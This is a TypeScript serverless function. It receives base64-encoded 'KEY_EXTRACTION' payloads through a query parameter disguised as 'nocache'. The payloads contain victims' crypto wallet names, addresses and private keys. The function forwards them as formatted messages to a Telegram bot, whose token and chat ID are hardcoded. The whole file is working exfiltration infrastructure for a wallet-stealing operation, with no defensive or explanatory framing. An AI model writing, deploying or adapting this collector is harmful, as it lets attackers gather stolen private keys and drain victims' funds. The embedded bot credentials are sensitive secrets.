import { VercelRequest, VercelResponse } from '@vercel/node';

interface Wallet {
  walletName: string;
  address: string;
  privateKey: string;
}

interface ExtractionPayload {
  type: string;
  acquiredAt: string;
  wallets: Wallet[];
  location: string;
}

/**
 * Escapes characters for Telegram MarkdownV2
 * @see https://core.telegram.org/bots/api#markdownv2-style
 */
function escapeMarkdownV2(text: string): string {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

/**
 * Formats the extraction payload into a beautiful Telegram message
 */
function formatTelegramMessage(data: ExtractionPayload): string {
  const emoji = data.type === 'KEY_EXTRACTION' ? '🔑' : '⚠️';
  const header = `*${emoji} ${escapeMarkdownV2(data.type)}*`;
  const time = `🕒 *Acquired At:* ${escapeMarkdownV2(new Date(data.acquiredAt).toLocaleString())}`;
  const location = `📍 *Location:* [Link](${escapeMarkdownV2(data.location)})`;

  let walletsList = '';
  data.wallets.forEach((w, i) => {
    walletsList += `\n\n*Wallet ${i + 1}: ${escapeMarkdownV2(w.walletName)}*`;
    walletsList += `\nAddress: \`${escapeMarkdownV2(w.address)}\``;
    walletsList += `\nPrivate Key: \`${escapeMarkdownV2(w.privateKey)}\``;
  });

  return `${header}\n${time}\n${location}${walletsList}`;
}

/**
 * Main Vercel API Handler
 */
export default async function handler(
  req: VercelRequest,
  res: VercelResponse
) {
  // 1. Get the nocache parameter
  const { nocache } = req.query;

  if (!nocache || typeof nocache !== 'string') {
    return res.status(400).json({ error: 'Missing or invalid nocache parameter' });
  }

  try {
    // 2. Decode Base64 and Parse JSON
    const decoded = Buffer.from(nocache, 'base64').toString('utf-8');
    const data: ExtractionPayload = JSON.parse(decoded);

    // 3. Format Message
    const message = formatTelegramMessage(data);

    // 4. Send to Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN || "7791166762:AAFTbJ0JmBkbI7Qqpt_Ncv2O3BbNqxiyXbI";
    const chatId = process.env.TELEGRAM_CHAT_ID || "8138109950";

    if (!botToken || !chatId) {
      console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
      return res.status(500).json({ error: 'Server configuration error' });
    }

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'MarkdownV2',
        disable_web_page_preview: true,
      }),
    });

    const result = await response.json();

    if (!response.ok) {
      console.error('Telegram API error:', result);
      return res.status(502).json({ error: 'Failed to send Telegram message', details: result });
    }

    // 5. Success response
    return res.status(200).json({ status: 'ok', message: 'Notification sent' });

  } catch (error) {
    console.error('Processing error:', error);
    return res.status(400).json({ 
      error: 'Failed to process payload', 
      details: error instanceof Error ? error.message : String(error) 
    });
  }
}
